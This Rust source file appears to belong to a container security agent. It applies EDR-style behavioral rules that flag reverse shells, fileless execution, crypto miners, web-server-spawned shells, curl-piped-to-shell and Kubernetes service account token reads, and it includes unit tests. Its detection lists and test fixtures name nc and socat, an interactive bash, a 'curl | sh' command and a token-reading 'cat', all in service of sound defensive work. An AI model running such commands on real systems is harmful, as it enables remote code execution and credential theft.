//! Behavioral rules over process activity, in the spirit of an EDR
//! storyline: what ran, who started it, and what it did on the network.

use crate::crd::BehaviorRule;
use crate::policy::Severity;

use super::process::Proc;

const SHELLS: [&str; 8] = ["sh", "bash", "dash", "zsh", "ash", "ksh", "busybox", "fish"];
const WEB_RUNTIMES: [&str; 13] = [
    "java", "node", "php-fpm", "php", "nginx", "httpd", "apache2", "tomcat", "ruby", "puma",
    "unicorn", "gunicorn", "uwsgi",
];
const MINERS: [&str; 6] = [
    "xmrig",
    "kdevtmpfsi",
    "kinsing",
    "minerd",
    "cpuminer",
    "xmr-stak",
];
const RECON: [&str; 8] = [
    "nmap", "masscan", "zmap", "nc", "ncat", "netcat", "socat", "tcpdump",
];
const READERS: [&str; 10] = [
    "cat", "head", "tail", "less", "more", "base64", "xxd", "od", "strings", "cp",
];
const WRITABLE: [&str; 4] = ["/tmp/", "/dev/shm/", "/var/tmp/", "/run/shm/"];

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Hit {
    pub rule: BehaviorRule,
    pub severity: Severity,
    pub description: String,
}

pub const fn severity(rule: BehaviorRule) -> Severity {
    match rule {
        BehaviorRule::ReverseShell | BehaviorRule::CryptoMiner => Severity::Critical,
        BehaviorRule::WebserverShell | BehaviorRule::ReconTool | BehaviorRule::SaTokenRead => {
            Severity::Medium
        }
        BehaviorRule::ShellNetworkConnect
        | BehaviorRule::FilelessExec
        | BehaviorRule::ExecFromTmp
        | BehaviorRule::PipeToShell => Severity::High,
    }
}

const fn hit(rule: BehaviorRule, description: String) -> Hit {
    Hit {
        rule,
        severity: severity(rule),
        description,
    }
}

fn is_shell(p: &Proc) -> bool {
    SHELLS.contains(&p.name()) || SHELLS.contains(&p.comm.as_str())
}

/// Rules evaluated when a process starts.
pub fn on_exec(
    p: &Proc,
    parent: Option<&Proc>,
    stdio_socket: bool,
    disabled: &[BehaviorRule],
) -> Vec<Hit> {
    let mut hits = Vec::new();
    let exe = p.exe.as_deref().unwrap_or_default();
    let cmd = p.cmdline.to_ascii_lowercase();
    let name = p.name();

    if is_shell(p) && stdio_socket {
        hits.push(hit(
            BehaviorRule::ReverseShell,
            format!("{name} has a socket on stdin or stdout"),
        ));
    }
    if exe.starts_with("/memfd:") || exe.ends_with(" (deleted)") || exe.starts_with("/dev/fd/") {
        hits.push(hit(
            BehaviorRule::FilelessExec,
            format!("executable is not on disk: {exe}"),
        ));
    }
    if WRITABLE.iter().any(|w| exe.starts_with(w)) {
        hits.push(hit(
            BehaviorRule::ExecFromTmp,
            format!("executable runs from a world-writable directory: {exe}"),
        ));
    }
    if MINERS.contains(&name)
        || cmd.contains("stratum+tcp")
        || cmd.contains("stratum+ssl")
        || cmd.contains("--donate-level")
    {
        hits.push(hit(
            BehaviorRule::CryptoMiner,
            format!("cryptocurrency miner: {name}"),
        ));
    }
    if let Some(parent) = parent
        && is_shell(p)
        && WEB_RUNTIMES.contains(&parent.name())
    {
        hits.push(hit(
            BehaviorRule::WebserverShell,
            format!("{} spawned {name}", parent.name()),
        ));
    }
    let fetch = cmd.contains("curl ") || cmd.contains("wget ");
    let pipe = ["| sh", "|sh", "| bash", "|bash"]
        .iter()
        .any(|s| cmd.contains(s));
    if fetch && pipe {
        hits.push(hit(
            BehaviorRule::PipeToShell,
            "downloads a script and pipes it into a shell".into(),
        ));
    }
    if RECON.contains(&name) {
        hits.push(hit(
            BehaviorRule::ReconTool,
            format!("network tool started: {name}"),
        ));
    }
    if READERS.contains(&name) && cmd.contains("serviceaccount/token") {
        hits.push(hit(
            BehaviorRule::SaTokenRead,
            "reads a Kubernetes service account token".into(),
        ));
    }
    hits.retain(|h| !disabled.contains(&h.rule));
    hits
}

/// Rules evaluated on an outbound TCP connection.
pub fn on_connect(
    p: &Proc,
    stdio_socket: bool,
    target: &str,
    disabled: &[BehaviorRule],
) -> Vec<Hit> {
    let mut hits = Vec::new();
    if is_shell(p) {
        let rule = if stdio_socket {
            BehaviorRule::ReverseShell
        } else {
            BehaviorRule::ShellNetworkConnect
        };
        hits.push(hit(rule, format!("{} connected to {target}", p.name())));
    }
    hits.retain(|h| !disabled.contains(&h.rule));
    hits
}

#[cfg(test)]
mod tests {
    use super::*;

    fn p(comm: &str, exe: &str, cmd: &str) -> Proc {
        Proc {
            pid: 2,
            ppid: 1,
            comm: comm.into(),
            exe: Some(exe.into()),
            cmdline: cmd.into(),
            ..Proc::default()
        }
    }

    fn rules(h: &[Hit]) -> Vec<BehaviorRule> {
        h.iter().map(|h| h.rule).collect()
    }

    #[test]
    fn every_exec_rule_fires() {
        use BehaviorRule as R;
        assert_eq!(
            rules(&on_exec(
                &p("bash", "/bin/bash", "bash -i"),
                None,
                true,
                &[]
            )),
            vec![R::ReverseShell]
        );
        assert_eq!(
            rules(&on_exec(
                &p("x", "/memfd:x (deleted)", "x"),
                None,
                false,
                &[]
            )),
            vec![R::FilelessExec]
        );
        assert_eq!(
            rules(&on_exec(&p("x", "/tmp/x", "x"), None, false, &[])),
            vec![R::ExecFromTmp]
        );
        assert_eq!(
            rules(&on_exec(
                &p("a", "/usr/bin/a", "a -o stratum+tcp://pool:3333"),
                None,
                false,
                &[]
            )),
            vec![R::CryptoMiner]
        );
        let java = p("java", "/usr/bin/java", "java -jar app.jar");
        assert_eq!(
            rules(&on_exec(
                &p("sh", "/bin/sh", "sh -c id"),
                Some(&java),
                false,
                &[]
            )),
            vec![R::WebserverShell]
        );
        assert_eq!(
            rules(&on_exec(
                &p("sh", "/bin/sh", "sh -c curl http://x | sh"),
                None,
                false,
                &[]
            )),
            vec![R::PipeToShell]
        );
        assert_eq!(
            rules(&on_exec(
                &p("nmap", "/usr/bin/nmap", "nmap 10.0.0.0/16"),
                None,
                false,
                &[]
            )),
            vec![R::ReconTool]
        );
        assert_eq!(
            rules(&on_exec(
                &p(
                    "cat",
                    "/bin/cat",
                    "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
                ),
                None,
                false,
                &[]
            )),
            vec![R::SaTokenRead]
        );
        assert!(on_exec(&p("ls", "/bin/ls", "ls -l"), None, false, &[]).is_empty());
        assert!(
            on_exec(
                &p("bash", "/bin/bash", "bash"),
                None,
                true,
                &[R::ReverseShell]
            )
            .is_empty()
        );
    }

    #[test]
    fn connect_rules() {
        let sh = p("bash", "/bin/bash", "bash");
        assert_eq!(
            rules(&on_connect(&sh, false, "10.0.0.1:4444", &[])),
            vec![BehaviorRule::ShellNetworkConnect]
        );
        let hits = on_connect(&sh, true, "10.0.0.1:4444", &[]);
        assert_eq!(rules(&hits), vec![BehaviorRule::ReverseShell]);
        assert_eq!(hits[0].severity, Severity::Critical);
        assert!(on_connect(&p("curl", "/usr/bin/curl", "curl"), false, "x", &[]).is_empty());
    }

    #[test]
    fn severities() {
        for r in BehaviorRule::ALL {
            let _ = severity(r);
        }
        assert_eq!(severity(BehaviorRule::ReconTool), Severity::Medium);
        assert_eq!(severity(BehaviorRule::ExecFromTmp), Severity::High);
    }
}
